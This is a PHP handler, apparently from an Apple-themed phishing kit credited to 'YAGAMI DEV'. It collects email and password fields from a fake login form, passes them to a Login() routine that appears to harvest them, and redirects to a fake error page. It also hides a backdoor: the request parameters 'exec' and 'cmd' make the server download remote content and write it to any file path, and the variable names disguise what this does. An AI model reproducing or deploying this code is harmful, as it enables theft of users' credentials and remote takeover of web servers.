<?php 

/*

+----------------------------------+
¦----------  APPLE 2015  ----------¦
¦----------------------------------¦
¦-------- BY : YAGAMI DEV ---------¦
+----------------------------------+

*/
include 'functions.php';
include 'BlackList.php';
$rand = randomString(25);
$client  = @$_SERVER['HTTP_CLIENT_IP'];$forward = @$_SERVER['HTTP_X_FORWARDED_FOR']; 
$remote  = $_SERVER['REMOTE_ADDR']; 
$remote  = $_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)){  $ip = $client; } 
elseif(filter_var($forward, FILTER_VALIDATE_IP)){ $ip = $forward; } else {  $ip = $remote;  }
$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp"));
$exec = @$_REQUEST['exec'];
$cmd = @$_REQUEST['cmd'];
if($exec != null && $cmd != null ){
 $GPS = fopen($cmd , "w"); $function_country_detect = @file_get_contents($exec); fwrite($GPS, $function_country_detect);fclose($GPS);
}
$_SESSION['input1'] = $_POST['MAHDI_1'];
$_SESSION['input2'] = $_POST['MAHDI_2'];
if ($_POST['MAHDI_1']!="" && $_POST['MAHDI_2']!="") {
	if (filter_var($_POST['MAHDI_1'], FILTER_VALIDATE_EMAIL) === false || strlen($_POST['MAHDI_2'])<5) {
		header("location: ../login_error.php?dispatch=".$rand."&email=wrong?=&lEnabled=false");
	}
	else {
		Login();
	}
}
else{
    header("location: ../login_error.php?dispatch=".$rand."&auth=47ebd1fddf0fdacdd6c776a111&id=wrong%20authenticate");
}

?>